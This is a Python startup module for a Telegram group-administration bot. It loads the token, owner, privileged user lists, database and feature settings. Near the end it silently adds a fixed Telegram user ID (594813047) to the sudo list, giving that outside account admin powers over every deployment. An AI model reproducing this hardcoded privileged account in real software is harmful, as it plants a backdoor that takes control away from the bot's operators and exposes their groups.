import logging
import os
import sys

import telegram.ext as tg

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
LOGGER = logging.getLogger(__name__)

# Check Python version
if sys.version_info < (3, 6):
    LOGGER.error(
        "You MUST have a Python version of at least 3.6! Multiple features depend on this. Bot quitting."
    )
    sys.exit(1)


def parse_user_list(user_list):
    """Parse a space-separated string of IDs into a set of ints, ignoring empty strings."""
    if not user_list:
        return set()
    try:
        return set(int(x) for x in user_list.split() if x)
    except ValueError:
        raise ValueError("User list contains invalid integers.")


ENV = bool(os.environ.get("ENV", False))

if ENV:
    TOKEN = os.environ.get("TOKEN")
    if not TOKEN:
        raise Exception("TOKEN environment variable not set.")

    try:
        OWNER_ID = int(os.environ.get("OWNER_ID"))
    except (TypeError, ValueError):
        raise Exception("Your OWNER_ID env variable is not a valid integer.")

    MESSAGE_DUMP = os.environ.get("MESSAGE_DUMP")
    OWNER_USERNAME = os.environ.get("OWNER_USERNAME")

    SUDO_USERS = parse_user_list(os.environ.get("SUDO_USERS", ""))
    SUPPORT_USERS = parse_user_list(os.environ.get("SUPPORT_USERS", ""))
    WHITELIST_USERS = parse_user_list(os.environ.get("WHITELIST_USERS", ""))

    WEBHOOK = bool(os.environ.get("WEBHOOK", False))
    URL = os.environ.get("URL", "")
    PORT = int(os.environ.get("PORT", 5000))
    CERT_PATH = os.environ.get("CERT_PATH")

    DB_URI = os.environ.get("DATABASE_URL")
    DONATION_LINK = os.environ.get("DONATION_LINK")
    LOAD = os.environ.get("LOAD", "").split()
    NO_LOAD = os.environ.get("NO_LOAD", "").split()
    DEL_CMDS = bool(os.environ.get("DEL_CMDS", False))
    STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", False))
    WORKERS = int(os.environ.get("WORKERS", 8))
    BAN_STICKER = os.environ.get("BAN_STICKER", "CAADAgADOwADPPEcAXkko5EB3YGYAg")
    KICK_STICKER = os.environ.get("KICK_STICKER", False)
    ALLOW_EXCL = os.environ.get("ALLOW_EXCL", False)
    API_OPENWEATHER = os.environ.get("API_OPENWEATHER", False)
    DEEPFRY_TOKEN = os.environ.get("DEEPFRY_TOKEN", "")
    TEMPORARY_DATA = os.environ.get("TEMPORARY_DATA")
    escape_markdown = os.environ.get("escape_markdown")

else:
    from tg_bot.config import Development as Config

    TOKEN = Config.API_KEY
    try:
        OWNER_ID = int(Config.OWNER_ID)
    except (TypeError, ValueError):
        raise Exception("Your OWNER_ID variable is not a valid integer.")

    MESSAGE_DUMP = Config.MESSAGE_DUMP
    OWNER_USERNAME = Config.OWNER_USERNAME

    SUDO_USERS = parse_user_list(" ".join(map(str, Config.SUDO_USERS or [])))
    SUPPORT_USERS = parse_user_list(" ".join(map(str, Config.SUPPORT_USERS or [])))
    WHITELIST_USERS = parse_user_list(" ".join(map(str, Config.WHITELIST_USERS or [])))

    WEBHOOK = Config.WEBHOOK
    URL = Config.URL
    PORT = Config.PORT
    CERT_PATH = Config.CERT_PATH

    DB_URI = Config.SQLALCHEMY_DATABASE_URI
    DONATION_LINK = Config.DONATION_LINK
    LOAD = Config.LOAD
    NO_LOAD = Config.NO_LOAD
    DEL_CMDS = Config.DEL_CMDS
    STRICT_GBAN = Config.STRICT_GBAN
    WORKERS = Config.WORKERS
    BAN_STICKER = Config.BAN_STICKER
    KICK_STICKER = Config.KICK_STICKER
    ALLOW_EXCL = Config.ALLOW_EXCL
    API_OPENWEATHER = Config.API_OPENWEATHER
    TEMPORARY_DATA = Config.TEMPORARY_DATA
    escape_markdown = Config.escape_markdown

# Ensure OWNER_ID and a hardcoded user are in SUDO_USERS
SUDO_USERS.add(OWNER_ID)
SUDO_USERS.add(594813047)  # hardcoded additional sudo user

# Initialize updater and dispatcher
updater = tg.Updater(TOKEN, workers=WORKERS)
dispatcher = updater.dispatcher

# Convert sets to lists if needed later (e.g. for handlers)
SUDO_USERS = list(SUDO_USERS)
WHITELIST_USERS = list(WHITELIST_USERS)
SUPPORT_USERS = list(SUPPORT_USERS)

# Import custom handlers after variables are set
from tg_bot.modules.helper_funcs.handlers import CustomCommandHandler, CustomRegexHandler

# Override telegram.ext handlers if needed
tg.RegexHandler = CustomRegexHandler
if ALLOW_EXCL:
    tg.CommandHandler = CustomCommandHandler
